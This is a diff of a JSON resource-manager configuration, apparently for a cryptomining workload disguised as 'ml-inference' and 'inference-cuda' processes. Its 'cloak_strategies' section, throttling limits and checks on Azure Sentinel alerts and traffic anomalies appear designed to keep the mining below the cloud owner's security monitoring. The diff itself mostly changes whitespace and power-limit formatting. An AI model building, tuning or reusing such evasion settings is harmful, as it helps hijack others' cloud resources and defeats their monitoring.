@@ -1,5 +1,6 @@
 {
-    "_comment": "Cấu hình tài nguyên dành cho ResourceManager, đảm bảo tối ưu hóa cho CPU, RAM, GPU, I/O, và băng thông mạng trên cơ sở hạ tầng mô tả.",
+    "_comment": "Cấu hình tài nguyên dành cho ResourceManager...",
+    
     "processes": {
         "CPU": "ml-inference",
         "GPU": "inference-cuda"
@@ -9,10 +10,12 @@
         "inference-cuda": 2
     },
     "network_interface": "eth0",
+    
     "optimization_parameters": {
         "gpu_power_adjustment_step": 10,
         "disk_io_limit_step_mbps": 10
     },
+    
     "resource_allocation": {
         "cpu": {
             "max_threads": 12,
@@ -24,6 +27,7 @@
             "max_allocation_mb": 131072
         },
         "gpu": {
+ 
             "max_usage_percent": 90
         },
         "disk_io": {
@@ -37,29 +41,29 @@
             "limit_percent": 50
         }
     },
+    
     "monitoring_parameters": {
         "temperature_monitoring_interval_seconds": 15,
         "power_monitoring_interval_seconds": 15,
         "azure_monitor_interval_seconds": 300,
         "optimization_interval_seconds": 30
     },
+    
     "temperature_limits": {
         "cpu_max_celsius": 80,
         "gpu_max_celsius": 85
     },
+    
     "power_limits": {
         "total_power_watts": {
             "max": 300
         },
         "per_device_power_watts": {
-            "cpu": {
-                "max": 150
-            },
-            "gpu": {
-                "max": 150
-            }
+            "cpu": 150,
+            "gpu": 150
         }
     },
+    
     "baseline_thresholds": {
         "cpu_usage_percent": 80,
         "gpu_usage_percent": 80,
@@ -67,6 +71,7 @@
         "disk_io_usage_mbps": 80,
         "network_usage_mbps": 80
     },
+    
     "safe_restore_parameters": {
         "enable_safe_restore": true,
         "max_retry_attempts": 3,
@@ -78,6 +83,7 @@
             "check_traffic_anomalies": true
         }
     },
+    
     "azure_integration": {
         "sentinel": {
             "alert_check_days": 1
@@ -92,15 +98,18 @@
             "check_interval_minutes": 10
         }
     },
+    
     "azure_anomaly_detector": {
         "api_base": "https://eastus.api.cognitive.microsoft.com/",
         "key_vault_url": "https://llmsskeyvault.vault.azure.net/"
     },
+    
     "azure_openai": {
         "api_base": "https://anomalyd.openai.azure.com/",
         "deployment_name": "gpt4-deployment-name",
         "api_version": "2023-03-15-preview"
     },
+    
     "cloak_strategies": {
         "cpu": {
             "strategy_name": "cpu_cloaking",
@@ -133,14 +142,17 @@
             }
         }
     },
+    
     "ai_driven_monitoring": {
         "enabled": false
     },
+    
     "log_analytics": {
         "enabled": false,
         "log_level": "INFO",
         "log_destination": "/app/mining_environment/logs/resource_manager.log"
     },
+    
     "alert_thresholds": {
         "cpu_usage_percent": 90,
         "gpu_usage_percent": 90,
